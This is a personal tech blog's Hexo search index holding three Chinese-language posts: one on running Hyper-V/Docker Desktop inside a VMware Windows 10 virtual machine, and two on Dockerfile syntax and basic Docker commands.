<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>虚拟化嵌套搭建指南</title>
    <url>/2022/10/13/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%B5%8C%E5%A5%97%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<h1 id="虚拟化嵌套搭建指南"><a href="#虚拟化嵌套搭建指南" class="headerlink" title="虚拟化嵌套搭建指南"></a>虚拟化嵌套搭建指南</h1><p>说通俗点，在虚拟机中使用hyper-v</p>
<span id="more"></span>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        作为一个docker使用者，在开发和调试的过程中使用繁琐的命令行是比较折磨的。尤其是像我这种对命令不熟悉的小白，每次都要翻越手册和笔记。于是，docker官方提供了能运行在3个系统上的docker desktop，并且随着版本不断地更新和迭代，docker desktop已经能覆盖绝大多数学习时用到的命令，极大程度简化了学习成本。</p>
<p>​        可以这么说，如果你是刚入门的小白，把docker基础命令过一遍，然后再去使用docker desktop，可以让你直接成为一个半资深的docker使用者。</p>
<p>​        但是，由于docker desktop安装时默认安装c盘，只能通过软连接的方式把应用装到其他盘里，再通过一系列高端技巧把镜像仓库也运到别的盘里（反正我失败了）。而我们知道，往往一个镜像就几百MB甚至几GB的大小，下载下来后，你还需要本地进行修改保存。这样下来，docker吃起空间来完全是不讲道理的。那么能不能把docker desktop扔到移动硬盘上去，即插即用呢？</p>
<p>​        于是，我想到了使用虚拟机VMware Station 16 pro，搭建一台win10虚拟机，并把它储存在移动硬盘上。正巧的是，微软官网最近也写了相关的文章，进一步证明了这一操作的可行性。</p>
<p><a href="https://learn.microsoft.com/zh-cn/virtualization/hyper-v-on-windows/tlfs/nested-virtualization">嵌套虚拟化</a></p>
<p><a href="https://learn.microsoft.com/zh-cn/virtualization/hyper-v-on-windows/user-guide/nested-virtualization">借助嵌套虚拟化在虚拟机中运行 Hyper-V</a></p>
<h2 id="本机操作流程"><a href="#本机操作流程" class="headerlink" title="本机操作流程"></a>本机操作流程</h2><h3 id="检查本机cpu是否开启虚拟机"><a href="#检查本机cpu是否开启虚拟机" class="headerlink" title="检查本机cpu是否开启虚拟机"></a>检查本机cpu是否开启虚拟机</h3><p><img src="https://c.img.dasctf.com/images/20221013/1665639280956-55de9e37-51bb-4bf7-adb1-8865cf86919f.png" alt="image-20221013133435372"></p>
<p>这个没什么好说的，默认都开了，没开的去BIOS里慢慢折腾吧。</p>
<h3 id="更新VMware到最新版本"><a href="#更新VMware到最新版本" class="headerlink" title="更新VMware到最新版本"></a>更新VMware到最新版本</h3><p>（当前为16.2.4 build-20089737）</p>
<p>大坑来了。在更新的过程中，疯狂提示这个报错</p>
<p><img src="https://c.img.dasctf.com/images/20221013/1665639516542-4826cbdc-8d04-4ab1-b0bd-7fc5a7b08739.png" alt="image-20221013133834326"></p>
<p>笑嘻了，这不有手就行？</p>
<p>点开这个，找个最新的下载一下，重启一下，完事咯~</p>
<p><a href="https://learn.microsoft.com/en-US/cpp/windows/latest-supported-vc-redist?view=msvc-170">Microsoft Visual C++ Redistributable latest supported downloads</a></p>
<p>感觉就是在侮辱我的智商。找个x64版本下载、安装、重启，点开VMware的更新，依然报这个错。于是折腾了一下午，想了很多可能出现问题的地方，依然无果。就是因为这个报错，差点直接让我放弃了进一步操作的念头。因为我也没有经验，只不过在零星的资料中，判断这一步可能是比较关键的一步。</p>
<p>那么这个bug到底是怎么解决的呢？</p>
<p><img src="https://c.img.dasctf.com/images/20221013/1665639958978-aebc2ad1-828d-4851-93a5-8e644031c846.png" alt="image-20221013134556235"></p>
<p>麻了，在刚刚的链接里找个x86版本下载、安装、重启，更新完毕。焯！</p>
<h3 id="升级虚拟机"><a href="#升级虚拟机" class="headerlink" title="升级虚拟机"></a>升级虚拟机</h3><p><img src="https://c.img.dasctf.com/images/20221013/1665640355054-db45382d-7dc4-4054-bded-77727e2df475.png" alt="image-20221013134759053"></p>
<p><img src="https://c.img.dasctf.com/images/20221013/1665640378187-df7a4185-c6aa-4f2f-ac72-5656bd0f9cba.png" alt="image-20221013135256244"></p>
<h3 id="更改虚拟机设置"><a href="#更改虚拟机设置" class="headerlink" title="更改虚拟机设置"></a>更改虚拟机设置</h3><p><img src="https://c.img.dasctf.com/images/20221013/1665640535263-82c9312f-7c65-4dbf-8d08-3dafad4133ed.png" alt="image-20221013135533199"></p>
<p>在处理器的虚拟化引擎里勾选第一项。然后看看能不能开启虚拟机。当然，如果这个时候启动成功没有报错，那么恭喜，你已经成功了。</p>
<h3 id="启动时报错此平台不支持虚拟化的Intel-VT-x-EPT"><a href="#启动时报错此平台不支持虚拟化的Intel-VT-x-EPT" class="headerlink" title="启动时报错此平台不支持虚拟化的Intel VT-x/EPT"></a>启动时报错此平台不支持虚拟化的Intel VT-x/EPT</h3><p>第二个大坑来了</p>
<h4 id="启用或关闭windows功能"><a href="#启用或关闭windows功能" class="headerlink" title="启用或关闭windows功能"></a>启用或关闭windows功能</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">功能名称</th>
<th style="text-align:center">开关状态</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Windows沙盒</td>
<td style="text-align:center">关闭</td>
</tr>
<tr>
<td style="text-align:center">Hyper-V(家庭版是没有的)</td>
<td style="text-align:center">关闭</td>
</tr>
<tr>
<td style="text-align:center">虚拟机平台</td>
<td style="text-align:center">打开</td>
</tr>
</tbody>
</table>
</div>
<h4 id="关闭内核隔离"><a href="#关闭内核隔离" class="headerlink" title="关闭内核隔离"></a>关闭内核隔离</h4><p>打开Windows安全中心&gt;设备安全性&gt;内核隔离，关闭</p>
<h4 id="cmd输入"><a href="#cmd输入" class="headerlink" title="cmd输入"></a>cmd输入</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">bcdedit /<span class="built_in">set</span> hypervisorlaunchtype off</span><br></pre></td></tr></table></figure>
<h4 id="重启电脑"><a href="#重启电脑" class="headerlink" title="重启电脑"></a>重启电脑</h4><p>此时再次打开虚拟机，应该没有什么问题了</p>
<h2 id="win10虚拟机操作流程"><a href="#win10虚拟机操作流程" class="headerlink" title="win10虚拟机操作流程"></a>win10虚拟机操作流程</h2><p>这个就是正常的安装docker的操作了，没什么难点和坑点，在我之前的笔记里也有详细地介绍。</p>
<h3 id="方便本机访问虚拟机"><a href="#方便本机访问虚拟机" class="headerlink" title="方便本机访问虚拟机"></a>方便本机访问虚拟机</h3><p>桥接+复制，开机后ipconfig即可。</p>
<h3 id="启动docker-desktop报错wsl出了问题"><a href="#启动docker-desktop报错wsl出了问题" class="headerlink" title="启动docker desktop报错wsl出了问题"></a>启动docker desktop报错wsl出了问题</h3><p>下载一个wsl.msi，安装完重启一下虚拟机即可。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/weixin_44047784/article/details/122209100">VMWare安装报错：此安装程序要求您重新启动系统以完成 Microsoft VC Redistributable安装，然后重新运行该安装程序。</a></p>
<p><a href="https://blog.csdn.net/u013511036/article/details/126049334">此平台不支持虚拟化的Intel VT-x/EPT</a></p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>debug</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker使用秘籍(2)</title>
    <url>/2022/06/22/Docker%E4%BD%BF%E7%94%A8%E7%A7%98%E7%B1%8D-2/</url>
    <content><![CDATA[<h1 id="Docker使用秘籍（2）"><a href="#Docker使用秘籍（2）" class="headerlink" title="Docker使用秘籍（2）"></a>Docker使用秘籍（2）</h1><p>本部分介绍Dockerfile的编写。</p>
<span id="more"></span>
<h2 id="Dockerfile使用方法"><a href="#Dockerfile使用方法" class="headerlink" title="Dockerfile使用方法"></a>Dockerfile使用方法</h2><h3 id="利用dockerfile构筑一个镜像"><a href="#利用dockerfile构筑一个镜像" class="headerlink" title="利用dockerfile构筑一个镜像"></a>利用dockerfile构筑一个镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker build -t nginx:v3 .</span><br></pre></td></tr></table></figure>
<h4 id="备注："><a href="#备注：" class="headerlink" title="备注："></a>备注：</h4><p><code>.</code>表示上下文路径。请勿将无用文件放入路径中，这样会导致镜像过大。</p>
<h3 id="dockerfile基本语法"><a href="#dockerfile基本语法" class="headerlink" title="dockerfile基本语法"></a>dockerfile基本语法</h3><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos</span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> yum -y install wget \</span></span><br><span class="line"><span class="bash">    &amp;&amp; wget -O redis.tar.gz <span class="string">&quot;http://download.redis.io/releases/redis-5.0.3.tar.gz&quot;</span> \</span></span><br><span class="line"><span class="bash">    &amp;&amp; tar -xvf redis.tar.gz</span></span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：Dockerfile 的指令每执行一次都会在 docker 上新建一层。所以过多无意义的层，会造成镜像膨胀过大.</p>
<h3 id="dockerfile指令简洁版摘要"><a href="#dockerfile指令简洁版摘要" class="headerlink" title="dockerfile指令简洁版摘要"></a>dockerfile指令简洁版摘要</h3><div class="table-container">
<table>
<thead>
<tr>
<th>指令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>FROM</strong></td>
<td>构建镜像基于哪个镜像</td>
</tr>
<tr>
<td>MAINTAINER</td>
<td>镜像维护者姓名或邮箱地址</td>
</tr>
<tr>
<td><strong>RUN</strong></td>
<td>构建镜像时运行的指令</td>
</tr>
<tr>
<td><strong>CMD</strong></td>
<td>运行容器时执行的shell环境</td>
</tr>
<tr>
<td>VOLUME</td>
<td>指定容器挂载点到宿主机自动生成的目录或其他容器</td>
</tr>
<tr>
<td>USER</td>
<td>为RUN、CMD、和 ENTRYPOINT 执行命令指定运行用户</td>
</tr>
<tr>
<td><strong>WORKDIR</strong></td>
<td>为 RUN、CMD、ENTRYPOINT、COPY 和 ADD 设置工作目录，就是切换目录</td>
</tr>
<tr>
<td>HEALTHCHECH</td>
<td>健康检查</td>
</tr>
<tr>
<td>ARG</td>
<td>构建时指定的一些参数</td>
</tr>
<tr>
<td><strong>EXPOSE</strong></td>
<td>声明容器的服务端口（仅仅是声明）</td>
</tr>
<tr>
<td><strong>ENV</strong></td>
<td>设置容器环境变量</td>
</tr>
<tr>
<td>ADD</td>
<td>拷贝文件或目录到容器中，如果是URL或压缩包便会自动下载或自动解压</td>
</tr>
<tr>
<td><strong>COPY</strong></td>
<td>拷贝文件或目录到容器中，跟ADD类似，但不具备自动下载或解压的功能</td>
</tr>
<tr>
<td><strong>ENTRYPOINT</strong></td>
<td>运行容器时执行的shell命令</td>
</tr>
</tbody>
</table>
</div>
<h3 id="详细讲解"><a href="#详细讲解" class="headerlink" title="详细讲解"></a>详细讲解</h3><h4 id="FROM"><a href="#FROM" class="headerlink" title="FROM"></a>FROM</h4><p>定制的镜像都是基于 FROM 的镜像，这里的 nginx 就是定制需要的基础镜像。后续的操作都是基于 nginx。</p>
<h4 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h4><p>用于执行后面跟着的命令行命令。有以下俩种格式：</p>
<p>shell:</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="bash"> &lt;命令行命令&gt;</span></span><br><span class="line"><span class="comment"># &lt;命令行命令&gt; 等同于，在终端操作的 shell 命令。</span></span><br></pre></td></tr></table></figure>
<p>exec:</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="bash"> [<span class="string">&quot;可执行文件&quot;</span>, <span class="string">&quot;参数1&quot;</span>, <span class="string">&quot;参数2&quot;</span>]</span></span><br><span class="line"><span class="comment"># 例如：</span></span><br><span class="line"><span class="comment"># RUN [&quot;./test.php&quot;, &quot;dev&quot;, &quot;offline&quot;] 等价于 RUN ./test.php dev offline</span></span><br></pre></td></tr></table></figure>
<h4 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h4><p>复制指令，从上下文目录中复制文件或者目录到容器里指定路径。</p>
<p>格式：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">COPY</span><span class="bash"> [--chown=&lt;user&gt;:&lt;group&gt;] &lt;源路径1&gt;...  &lt;目标路径&gt;</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> [--chown=&lt;user&gt;:&lt;group&gt;] [<span class="string">&quot;&lt;源路径1&gt;&quot;</span>,...  <span class="string">&quot;&lt;目标路径&gt;&quot;</span>]</span></span><br></pre></td></tr></table></figure>
<p><strong>[—chown=<user>:<group>]</strong>：可选参数，用户改变复制到容器内文件的拥有者和属组。</p>
<p><strong>&lt;源路径&gt;</strong>：源文件或者源目录，这里可以是通配符表达式，其通配符规则要满足 Go 的 filepath.Match 规则。</p>
<p><strong>&lt;目标路径&gt;</strong>：容器内的指定路径，该路径不用事先建好，路径不存在的话，会自动创建。</p>
<h4 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h4><p>ADD 指令和 COPY 的使用格类似（同样需求下，官方推荐使用 COPY）。功能也类似，不同之处如下：</p>
<ul>
<li>ADD 的优点：在执行 &lt;源文件&gt; 为 tar 压缩文件的话，压缩格式为 gzip, bzip2 以及 xz 的情况下，会自动复制并解压到 &lt;目标路径&gt;。</li>
<li>ADD 的缺点：在不解压的前提下，无法复制 tar 压缩文件。会令镜像构建缓存失效，从而可能会令镜像构建变得比较缓慢。具体是否使用，可以根据是否需要自动解压来决定。</li>
</ul>
<h4 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h4><p>类似于 RUN 指令，用于运行程序，但二者运行的时间点不同:</p>
<ul>
<li>CMD 在docker run 时运行。</li>
<li>RUN 是在 docker build。</li>
</ul>
<p><strong>作用</strong>：为启动的容器指定默认要运行的程序，程序运行结束，容器也就结束。CMD 指令指定的程序可被 docker run 命令行参数中指定要运行的程序所覆盖。</p>
<p><strong>注意</strong>：如果 Dockerfile 中如果存在多个 CMD 指令，仅最后一个生效。</p>
<p>格式：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CMD</span><span class="bash"> &lt;shell 命令&gt; </span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;&lt;可执行文件或命令&gt;&quot;</span>,<span class="string">&quot;&lt;param1&gt;&quot;</span>,<span class="string">&quot;&lt;param2&gt;&quot;</span>,...] </span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;&lt;param1&gt;&quot;</span>,<span class="string">&quot;&lt;param2&gt;&quot;</span>,...]  <span class="comment"># 该写法是为 ENTRYPOINT 指令指定的程序提供默认参数</span></span></span><br></pre></td></tr></table></figure>
<p>推荐使用第二种格式，执行过程比较明确。第一种格式实际上在运行的过程中也会自动转换成第二种格式运行，并且默认可执行文件是 sh。</p>
<h4 id="ENTRYPOINT"><a href="#ENTRYPOINT" class="headerlink" title="ENTRYPOINT"></a>ENTRYPOINT</h4><p>类似于 CMD 指令，但其不会被 docker run 的命令行参数指定的指令所覆盖，而且这些命令行参数会被当作参数送给 ENTRYPOINT 指令指定的程序。</p>
<p>但是, 如果运行 docker run 时使用了 —entrypoint 选项，将覆盖 ENTRYPOINT 指令指定的程序。</p>
<p><strong>优点</strong>：在执行 docker run 的时候可以指定 ENTRYPOINT 运行所需的参数。</p>
<p><strong>注意</strong>：如果 Dockerfile 中如果存在多个 ENTRYPOINT 指令，仅最后一个生效。</p>
<p>格式：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">&quot;&lt;executeable&gt;&quot;</span>,<span class="string">&quot;&lt;param1&gt;&quot;</span>,<span class="string">&quot;&lt;param2&gt;&quot;</span>,...]</span></span><br></pre></td></tr></table></figure>
<p>可以搭配 CMD 命令使用：一般是变参才会使用 CMD ，这里的 CMD 等于是在给 ENTRYPOINT 传参。</p>
<h4 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h4><p>设置环境变量，定义了环境变量，那么在后续的指令中，就可以使用这个环境变量。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ENV</span> &lt;key&gt; &lt;value&gt;</span><br><span class="line"><span class="keyword">ENV</span> &lt;key1&gt;=&lt;value1&gt; &lt;key2&gt;=&lt;value2&gt;...</span><br></pre></td></tr></table></figure>
<h4 id="ARG"><a href="#ARG" class="headerlink" title="ARG"></a>ARG</h4><p>构建参数，与 ENV 作用一致。不过作用域不一样。ARG 设置的环境变量仅对 Dockerfile 内有效，也就是说只有 docker build 的过程中有效，构建好的镜像内不存在此环境变量。</p>
<p>构建命令 docker build 中可以用 —build-arg &lt;参数名&gt;=&lt;值&gt; 来覆盖。</p>
<p>格式：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ARG</span> &lt;参数名&gt;[=&lt;默认值&gt;]</span><br></pre></td></tr></table></figure>
<h4 id="VOLUME"><a href="#VOLUME" class="headerlink" title="VOLUME"></a>VOLUME</h4><p>定义匿名数据卷。在启动容器时忘记挂载数据卷，会自动挂载到匿名卷。</p>
<p>作用：</p>
<ul>
<li>避免重要的数据，因容器重启而丢失，这是非常致命的。</li>
<li>避免容器不断变大。</li>
</ul>
<p>格式：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">VOLUME</span><span class="bash"> [<span class="string">&quot;&lt;路径1&gt;&quot;</span>, <span class="string">&quot;&lt;路径2&gt;&quot;</span>...]</span></span><br><span class="line"><span class="keyword">VOLUME</span><span class="bash"> &lt;路径&gt;</span></span><br></pre></td></tr></table></figure>
<p>在启动容器 docker run 的时候，我们可以通过 -v 参数修改挂载点。</p>
<h4 id="EXPOSE"><a href="#EXPOSE" class="headerlink" title="EXPOSE"></a>EXPOSE</h4><p>仅仅只是声明端口。</p>
<p>作用：</p>
<ul>
<li>帮助镜像使用者理解这个镜像服务的守护端口，以方便配置映射。</li>
<li>在运行时使用随机端口映射时，也就是 docker run -P 时，会自动随机映射 EXPOSE 的端口。</li>
</ul>
<p>格式：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">EXPOSE</span> &lt;端口<span class="number">1</span>&gt; [&lt;端口<span class="number">2</span>&gt;...]</span><br></pre></td></tr></table></figure>
<h4 id="WORKDIR"><a href="#WORKDIR" class="headerlink" title="WORKDIR"></a>WORKDIR</h4><p>指定工作目录。用 WORKDIR 指定的工作目录，会在构建镜像的每一层中都存在。（WORKDIR 指定的工作目录，必须是提前创建好的）。</p>
<p>docker build 构建镜像过程中的，每一个 RUN 命令都是新建的一层。只有通过 WORKDIR 创建的目录才会一直存在。</p>
<p>格式：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> &lt;工作目录路径&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="USER"><a href="#USER" class="headerlink" title="USER"></a>USER</h4><p>用于指定执行后续命令的用户和用户组，这边只是切换后续命令执行的用户（用户和用户组必须提前已经存在）。</p>
<p>格式：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">USER</span> &lt;用户名&gt;[:&lt;用户组&gt;]</span><br></pre></td></tr></table></figure>
<h4 id="HEALTHCHECK"><a href="#HEALTHCHECK" class="headerlink" title="HEALTHCHECK"></a>HEALTHCHECK</h4><p>用于指定某个程序或者指令来监控 docker 容器服务的运行状态。</p>
<p>格式：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">HEALTHCHECK</span><span class="bash"> [选项] CMD &lt;命令&gt;：设置检查容器健康状况的命令</span></span><br><span class="line"><span class="keyword">HEALTHCHECK</span><span class="bash"> NONE：如果基础镜像有健康检查指令，使用这行可以屏蔽掉其健康检查指令</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">HEALTHCHECK</span><span class="bash"> [选项] CMD &lt;命令&gt; : 这边 CMD 后面跟随的命令使用，可以参考 CMD 的用法。</span></span><br></pre></td></tr></table></figure>
<h4 id="ONBUILD"><a href="#ONBUILD" class="headerlink" title="ONBUILD"></a>ONBUILD</h4><p>用于延迟构建命令的执行。简单的说，就是 Dockerfile 里用 ONBUILD 指定的命令，在本次构建镜像的过程中不会执行（假设镜像为  test-build）。当有新的 Dockerfile 使用了之前构建的镜像 FROM test-build ，这时执行新镜像的  Dockerfile 构建时候，会执行 test-build 的 Dockerfile 里的 ONBUILD 指定的命令。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ONBUILD</span> &lt;其它指令&gt;</span><br></pre></td></tr></table></figure>
<h4 id="LABEL"><a href="#LABEL" class="headerlink" title="LABEL"></a>LABEL</h4><p>LABEL 指令用来给镜像添加一些元数据（metadata），以键值对的形式，语法格式如下：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LABEL</span><span class="bash"> &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; </span></span><br></pre></td></tr></table></figure>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://www.runoob.com/docker/docker-compose.html">菜鸟教程Docker Dockerfile </a></p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker使用秘籍(1)</title>
    <url>/2022/06/05/Docker%E4%BD%BF%E7%94%A8%E7%A7%98%E7%B1%8D/</url>
    <content><![CDATA[<h1 id="Docker使用秘籍（1）"><a href="#Docker使用秘籍（1）" class="headerlink" title="Docker使用秘籍（1）"></a>Docker使用秘籍（1）</h1><p>近期再次进一步学习了一下docker，做一些笔记来总结一下使用心得。本篇为一些初阶的入门命令记录。</p>
<span id="more"></span>
<h2 id="Docker基础配置"><a href="#Docker基础配置" class="headerlink" title="Docker基础配置"></a>Docker基础配置</h2><h3 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com -o get-docker.sh</span><br><span class="line">sh get-docker.sh</span><br></pre></td></tr></table></figure>
<h3 id="Dokcer镜像加速"><a href="#Dokcer镜像加速" class="headerlink" title="Dokcer镜像加速"></a>Dokcer镜像加速</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docker.mirrors.ustc.edu.cn&#x2F;</span><br></pre></td></tr></table></figure>
<h3 id="查看Docker配置情况"><a href="#查看Docker配置情况" class="headerlink" title="查看Docker配置情况"></a>查看Docker配置情况</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker info</span><br><span class="line">docker --version</span><br></pre></td></tr></table></figure>
<h3 id="Docker开启、后台运行、重启"><a href="#Docker开启、后台运行、重启" class="headerlink" title="Docker开启、后台运行、重启"></a>Docker开启、后台运行、重启</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo systemctl start docker</span><br><span class="line">sudo systemctl enable docker</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
<h2 id="Docker基本命令"><a href="#Docker基本命令" class="headerlink" title="Docker基本命令"></a>Docker基本命令</h2><h3 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h3><h4 id="获取镜像"><a href="#获取镜像" class="headerlink" title="获取镜像"></a>获取镜像</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker pull ubuntu</span><br></pre></td></tr></table></figure>
<h4 id="查找镜像"><a href="#查找镜像" class="headerlink" title="查找镜像"></a>查找镜像</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker search ubuntu</span><br></pre></td></tr></table></figure>
<h4 id="查看本地镜像"><a href="#查看本地镜像" class="headerlink" title="查看本地镜像"></a>查看本地镜像</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
<h4 id="更新镜像"><a href="#更新镜像" class="headerlink" title="更新镜像"></a>更新镜像</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker commit -m&#x3D;&quot;has update&quot; -a&#x3D;&quot;runoob&quot; e218edb10161 runoob&#x2F;ubuntu:v2</span><br></pre></td></tr></table></figure>
<p>各个参数说明：</p>
<ul>
<li><strong>-m:</strong> 提交的描述信息</li>
<li><strong>-a:</strong> 指定镜像作者</li>
<li><strong>e218edb10161：</strong>容器 ID</li>
<li><strong>runoob/ubuntu:v2:</strong> 指定要创建的目标镜像名</li>
</ul>
<h4 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker build -t runoob&#x2F;centos:6.7 .</span><br></pre></td></tr></table></figure>
<p>参数说明：</p>
<ul>
<li><strong>-t</strong> ：指定要创建的目标镜像名</li>
<li><strong>.</strong> ：Dockerfile 文件所在目录，可以指定Dockerfile 的绝对路径</li>
</ul>
<h4 id="设置镜像标签"><a href="#设置镜像标签" class="headerlink" title="设置镜像标签"></a>设置镜像标签</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker tag &lt;id&gt; runoob&#x2F;centos:dev</span><br></pre></td></tr></table></figure>
<h3 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h3><h4 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -it ubuntu /bin/bash</span><br></pre></td></tr></table></figure>
<p>参数说明：</p>
<ul>
<li><strong>-i</strong>: 交互式操作。</li>
<li><strong>-t</strong>: 终端。</li>
<li><strong>ubuntu</strong>: ubuntu 镜像。</li>
<li><strong>/bin/bash</strong>：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 /bin/bash。</li>
</ul>
<p>要退出终端，直接输入 <strong>exit</strong></p>
<h4 id="查看正在运行的容器"><a href="#查看正在运行的容器" class="headerlink" title="查看正在运行的容器"></a>查看正在运行的容器</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>
<h4 id="查看所有容器"><a href="#查看所有容器" class="headerlink" title="查看所有容器"></a>查看所有容器</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>
<h4 id="查看容器日志"><a href="#查看容器日志" class="headerlink" title="查看容器日志"></a>查看容器日志</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker logs &lt;id&gt;</span><br><span class="line">docker logs &lt;name&gt;</span><br><span class="line">docker logs -f &lt;id&gt;</span><br></pre></td></tr></table></figure>
<p><strong>-f:</strong> 让 <strong>docker logs</strong> 像使用 <strong>tail -f</strong> 一样来输出容器内部的标准输出。</p>
<h4 id="后台运行容器"><a href="#后台运行容器" class="headerlink" title="后台运行容器"></a>后台运行容器</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -it -d ubuntu /bin/bash</span><br></pre></td></tr></table></figure>
<h4 id="启动、停止、重启容器"><a href="#启动、停止、重启容器" class="headerlink" title="启动、停止、重启容器"></a>启动、停止、重启容器</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker start &lt;id&gt;</span><br><span class="line">docker stop &lt;id&gt;</span><br><span class="line">docker restart &lt;id&gt;</span><br></pre></td></tr></table></figure>
<h4 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it &lt;id&gt; &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<h4 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rm -f &lt;id&gt;</span><br></pre></td></tr></table></figure>
<h4 id="导出-导入容器"><a href="#导出-导入容器" class="headerlink" title="导出/导入容器"></a>导出/导入容器</h4><p>导出容器快照</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker export &lt;id&gt; &gt; ubuntu.tar</span><br></pre></td></tr></table></figure>
<p>导入容器快照</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat docker&#x2F;ubuntu.tar | docker import - test&#x2F;ubuntu:v1</span><br><span class="line">docker import http:&#x2F;&#x2F;example.com&#x2F;exampleimage.tgz example&#x2F;imagerepo</span><br></pre></td></tr></table></figure>
<h4 id="设置web应用端口"><a href="#设置web应用端口" class="headerlink" title="设置web应用端口"></a>设置web应用端口</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 5000:80 &lt;web&gt;</span><br><span class="line">docker run -d -P &lt;web&gt;</span><br><span class="line">docker port &lt;id&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>-p 前一个端口为宿主机目标端口，后一个是容器端口</li>
<li>-P 为随机分配端口</li>
</ul>
<h4 id="查看容器进程"><a href="#查看容器进程" class="headerlink" title="查看容器进程"></a>查看容器进程</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker top &lt;id&gt;</span><br></pre></td></tr></table></figure>
